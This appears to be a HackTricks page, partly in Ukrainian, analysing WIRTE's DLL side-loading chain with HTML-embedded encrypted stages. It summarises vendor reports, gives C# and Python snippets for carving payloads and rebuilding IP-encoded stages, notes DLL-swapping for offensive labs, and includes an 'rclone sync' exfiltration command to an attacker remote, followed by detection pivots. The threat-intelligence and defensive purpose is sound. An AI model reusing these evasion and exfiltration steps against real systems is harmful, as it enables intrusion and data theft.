# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Огляд tradecraft

Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: benign PDFs instruct targets to pull a RAR archive from a file-sharing site. The archive bundles a real-looking document viewer EXE, a malicious DLL named after a trusted library (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), and a decoy `Document.pdf`.
- **DLL search order abuse**: the victim double-clicks the EXE, Windows resolves the DLL import from the current directory, and the malicious loader (AshenLoader) executes inside the trusted process while the decoy PDF opens to avoid suspicion.
- **Living-off-the-land staging**: every later stage (AshenStager → AshenOrchestrator → modules) is kept off disk until needed, delivered as encrypted blobs hidden inside otherwise harmless HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: the EXE side-loads AshenLoader, which performs host recon, AES-CTR encrypts it, and POSTs it inside rotating parameters such as `token=`, `id=`, `q=`, or `auth=` to API-looking paths (e.g., `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML extraction**: the C2 only betrays the next stage when the client IP geolocates to the target region and the `User-Agent` matches the implant, frustrating sandboxes. When the checks pass the HTTP body contains a `<headerp>...</headerp>` blob with the Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager is deployed with another legitimate binary that imports `wtsapi32.dll`. The malicious copy injected into the binary fetches more HTML, this time carving `<article>...</article>` to recover AshenOrchestrator.
4. **AshenOrchestrator**: a modular .NET controller that decodes a Base64 JSON config. The config’s `tg` and `au` fields are concatenated/hashed into the AES key, which decrypts `xrk`. The resulting bytes act as an XOR key for every module blob fetched afterwards.
5. **Module delivery**: each module is described through HTML comments that redirect the parser to an arbitrary tag, breaking static rules that look only for `<headerp>` or `<article>`. Modules include persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`).

### Шаблон парсингу HTML-контейнера
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Навіть якщо захисники блокують або видаляють певний елемент, оператору достатньо змінити тег, зазначений у HTML-коментарі, щоб відновити доставку.<sup>[[1]](#references)</sup>

### Швидкий помічник для видобування (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Паралелі обходу виявлення під час HTML Staging

Нещодавні дослідження HTML smuggling (Talos) висвітлюють payloads, приховані як Base64-рядки всередині блоків `<script>` у HTML-вкладеннях і декодовані через JavaScript під час виконання.<sup>[[2]](#references)</sup> Цей самий прийом можна повторно використати для відповідей C2: розміщувати зашифровані blobs усередині тега `<script>` (або іншого елемента DOM) і декодувати їх у пам’яті перед AES/XOR, щоб сторінка виглядала як звичайний HTML. Talos також демонструє багаторівневу обфускацію (перейменування ідентифікаторів разом із Base64/Caesar/AES) усередині тегів script, що легко переноситься на HTML-staged C2 blobs.<sup>[[2]](#references)</sup> Пізніший матеріал Talos про **hidden text salting** також тут доречний: розділення Base64 за допомогою неважливих HTML-коментарів або пробілів достатньо, щоб зламати прості regex-екстрактори, водночас відновлення в браузері залишається тривіальним.<sup>[[7]](#references)</sup>

## Примітки щодо нещодавніх варіантів (2024-2025)

- Check Point спостерігав кампанії WIRTE у 2024 році, які й надалі базувалися на archive-based sideloading, але використовували `propsys.dll` (stagerx64) як перший stage. Stager декодує наступний payload за допомогою Base64 + XOR (ключ `53`), надсилає HTTP-запити з hardcoded `User-Agent` і витягує зашифровані blobs, вбудовані між HTML-тегами. В одній із гілок stage відновлювався з довгого списку вбудованих IP-рядків, декодованих через `RtlIpv4StringToAddressA`, після чого вони об’єднувалися в байти payload.<sup>[[3]](#references)</sup>
- OWN-CERT задокументував попередні інструменти WIRTE, у яких side-loaded `wtsapi32.dll` dropper захищав рядки за допомогою Base64 + TEA і використовував саме ім’я DLL як ключ розшифрування, а потім обфускував дані ідентифікації хоста за допомогою XOR/Base64 перед їх надсиланням до C2.<sup>[[4]](#references)</sup>

## Відновлення IP-кодованих Stages

Гілка WIRTE з `propsys.dll` за 2024 рік демонструє, що наступний PE не обов’язково має зберігатися як один суцільний HTML blob. Loader може зберігати байти stage у вигляді dotted-quad рядків і відновлювати їх за допомогою `RtlIpv4StringToAddressA` — це підхід, тісно пов’язаний із tradecraft Hive **IPfuscation**.<sup>[[3]](#references)[[5]](#references)</sup> З операційного погляду це корисно, коли actor хоче, щоб HTML-сторінка містила те, що виглядає як нешкідливі IOC або config data, а не очевидний Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Якщо відновлені байти починаються з `MZ`, імовірно, ви безпосередньо відновили наступний PE. Якщо ні, перевірте наявність початкового шару XOR/Base64 або невеликих фрагментів-роздільників між адресами.

## Swappable DLL Names & Host Rotation

Важливою властивістю цього шаблону є те, що **HTML/AES/XOR staging backend може залишатися ідентичним, тоді як змінюється лише sideload pair**. У різних кампаніях WIRTE використовувала `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` і `propsys.dll`, що корисно з таких причин:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` і `wtsapi32.dll` — непомітні назви Windows DLL, які захисники очікують побачити в `%System32%` / `%SysWOW64%`.
- Публічні каталоги, такі як **HijackLibs**, уже містять інформацію про багато бінарних файлів, які завантажують ці DLL імена з каталогу скопійованого застосунку, надаючи операторам альтернативні host-и без перепроєктування stager-а.
- Для кожного host-а потрібно адаптувати лише export surface. HTML parser, AES/XOR routines і module loader зазвичай можна без змін перенести до forwarding proxy DLL.

Для offensive lab work це означає, що проблему можна розділити на **(1) пошук стабільного підписаного host-а, який локально вирішує обране DLL ім’я, і (2) повторне використання тієї самої staged-HTML loader logic за цим DLL**.

## Crypto & C2 Hardening

- **AES-CTR всюди**: поточні loader-и містять 256-бітні ключі та nonce-и (наприклад, `{9a 20 51 98 ...}`) і за потреби додають XOR layer, використовуючи такі рядки, як `msasn1.dll`, до або після розшифрування.<sup>[[1]](#references)</sup>
- **Варіації key material**: у попередніх loader-ах для захисту embedded strings використовувалися Base64 + TEA, а ключ розшифрування виводився з malicious DLL name (наприклад, `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**: staging servers розділені для кожного інструмента, розміщені в різних ASN, а іноді прикриті subdomain-ами, що виглядають легітимно, тому компрометація одного stage не розкриває решту.
- **Recon smuggling**: перелічені дані тепер містять списки Program Files для виявлення цінних застосунків і завжди шифруються перед передаванням із host-а.
- **URI churn**: query parameters і REST paths змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), що робить крихкі detections неефективними.
- **User-Agent pinning + safe redirects**: C2 infrastructure відповідає лише на точні UA strings, а в інших випадках перенаправляє на нешкідливі news/health sites, щоб злитися зі звичайним трафіком.
- **Gated delivery**: servers використовують geo-fencing і відповідають лише справжнім implant-ам. Неавторизовані клієнти отримують нешкідливий HTML.

## Persistence & Execution Loop

AshenStager створює scheduled tasks, які маскуються під Windows maintenance jobs і виконуються через `svchost.exe`, наприклад:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці tasks повторно запускають sideloading chain під час завантаження системи або через певні інтервали, завдяки чому AshenOrchestrator може запитувати свіжі modules, не записуючи їх знову на диск.

## Using Benign Sync Clients for Exfiltration

Оператори розміщують diplomatic documents у `C:\Users\Public` (доступному для читання всім користувачам і не підозрілому) через dedicated module, а потім завантажують легітимний бінарний файл [Rclone](https://rclone.org/), щоб синхронізувати цей каталог зі сховищем атакувальника. Unit42 зазначає, що це перший випадок, коли цього актора помітили за використанням Rclone для exfiltration, що відповідає ширшій тенденції зловживання легітимними sync tooling для маскування під звичайний трафік:<sup>[[1]](#references)</sup>

1. **Stage**: скопіювати/зібрати target files у `C:\Users\Public\{campaign}\`.
2. **Configure**: передати конфігурацію Rclone, що вказує на контрольований атакувальником HTTPS endpoint (наприклад, `api.technology-system[.]com`).
3. **Sync**: запустити `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, щоб трафік нагадував звичайні cloud backups.

Оскільки Rclone широко використовується для легітимних backup workflows, захисники повинні зосередитися на аномальних запусках (нові бінарні файли, нетипові remotes або раптова синхронізація `C:\Users\Public`).

## Detection Pivots

- Створюйте alert-и для **signed processes**, які несподівано завантажують DLL із user-writable paths (фільтри Procmon + `Get-ProcessMitigation -Module`), особливо якщо назви DLL збігаються з `netutils`, `srvcli`, `dwampi`, `wtsapi32` або `propsys`.<sup>[[6]](#references)</sup>
- Перевіряйте підозрілі HTTPS responses на наявність **великих Base64 blobs, embedded у незвичних tags** або захищених коментарями `<!-- TAG: <xyz> -->`.
- Спочатку нормалізуйте HTML: **видаліть comments і об’єднайте whitespace перед Base64 extraction**, оскільки evasion у стилі hidden-text-salting може розділяти payload між comment boundaries.
- Розширте HTML hunting на **Base64 strings усередині `<script>` blocks** (staging у стилі HTML smuggling), які декодуються через JavaScript перед AES/XOR processing.
- Шукайте повторювані виклики **`RtlIpv4StringToAddressA`, за якими слідує складання buffer-а**, особливо коли навколишні strings є довгими списками IPv4, а не справжніми network targets.
- Шукайте **scheduled tasks**, які запускають `svchost.exe` з аргументами, не пов’язаними зі службами, або вказують на dropper directories.
- Відстежуйте **C2 redirects**, які повертають payload-и лише для точних `User-Agent` strings, а в інших випадках перенаправляють на легітимні news/health domains.
- Відстежуйте появу **Rclone** binaries поза IT-managed locations, нових файлів `rclone.conf` або sync jobs, що отримують дані зі staging directories, таких як `C:\Users\Public`.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
